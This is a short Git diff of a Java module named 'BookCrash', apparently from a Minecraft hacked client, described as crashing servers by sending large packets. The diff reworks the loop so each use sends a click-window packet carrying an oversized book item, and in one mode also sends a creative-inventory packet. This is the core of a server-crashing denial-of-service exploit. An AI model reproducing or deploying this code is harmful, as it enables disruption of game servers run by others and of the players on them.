@@ -24,7 +24,7 @@ import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 /**
  * Created by d1gress/Qther on 24/11/2019.	 * Created by d1gress/Qther on 25/11/2019.
- *
+ * Updated by d1gress/Qther on 26/11/2019.
  */
 @Module.Info(name = "BookCrash", category = Module.Category.MISC, description = "Crashes servers by sending large packets")
 public class BookCrash extends Module{
@@ -83,9 +83,8 @@ public class BookCrash extends Module{
         bookObj.setTagCompound(tag);
 
         for(int i = 0; i < uses.getValue(); i++) {
-            if(mode.getValue() == Mode.RAION) {
-                mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
-            }else {
+            mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
+            if(mode.getValue() == Mode.JESSICA) {
                 mc.playerController.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
             }
         }
